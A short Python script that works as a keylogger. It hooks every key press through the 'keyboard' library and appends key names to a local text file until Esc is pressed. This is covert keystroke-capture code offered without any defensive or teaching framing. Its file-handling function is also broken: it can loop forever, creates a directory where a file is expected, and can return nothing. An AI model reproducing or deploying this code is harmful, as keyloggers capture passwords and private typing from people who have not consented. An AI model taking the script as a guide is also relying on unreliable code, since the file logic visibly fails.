import os
import keyboard

def check_file(path: str):
    if not os.path.exists("a.txt"):
        i=1
        while not os.path.exists(path+f"a_{i}.txt"):
            i+=1
        os.mkdir(path+f"a_{i}.txt")
        return path+f"a_{i}.txt"

def write_keypress_to_file(e):
    file_name = check_file(path="./")
    if e.event_type == 'down':
        with open(file_name, "a") as file:
            file.writelines(e.name)

keyboard.on_press(write_keypress_to_file)
keyboard.wait('esc')